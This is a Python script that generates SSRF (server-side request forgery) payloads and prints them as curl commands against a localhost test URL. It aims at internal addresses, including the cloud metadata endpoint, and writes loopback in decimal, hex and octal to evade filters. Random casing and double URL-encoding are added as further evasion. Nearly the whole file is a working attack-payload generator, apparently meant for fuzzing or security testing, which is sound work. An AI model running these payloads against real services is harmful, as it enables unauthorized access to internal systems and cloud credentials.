import random
import urllib.parse

TARGET = "http://localhost/test?"

PARAMS = [
    "url", "uri", "dest", "redirect", "next",
    "callback", "fetch", "image", "path", "data"
]

INTERNAL_TARGETS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254",
    "http://10.0.0.1",
    "http://192.168.1.1",
    "http://172.16.0.1",
    "http://[::1]"
]

# Obfuscated internal IP formats
OBFUSCATED_TARGETS = [
    "http://2130706433",          # decimal 127.0.0.1
    "http://0x7f000001",          # hex 127.0.0.1
    "http://0177.0.0.1",          # octal-like
]

PATHS = [
    "/admin",
    "/dashboard",
    "/config",
    "/metadata",
    "/test",
    "/internal"
]

def random_case(s):
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

def maybe_encode(s):
    if random.random() > 0.5:
        s = urllib.parse.quote(s)
    if random.random() > 0.7:
        s = urllib.parse.quote(s)
    return s

def generate_payload():
    base = random.choice(INTERNAL_TARGETS + OBFUSCATED_TARGETS)
    path = random.choice(PATHS)
    payload = base + path

    if random.random() > 0.5:
        payload = random_case(payload)

    payload = maybe_encode(payload)

    return payload

generated = set()

while len(generated) < 100:
    param = random.choice(PARAMS)
    payload = generate_payload()
    curl_cmd = f'curl "{TARGET}{param}={payload}"'
    generated.add(curl_cmd)

for cmd in generated:
    print(cmd)
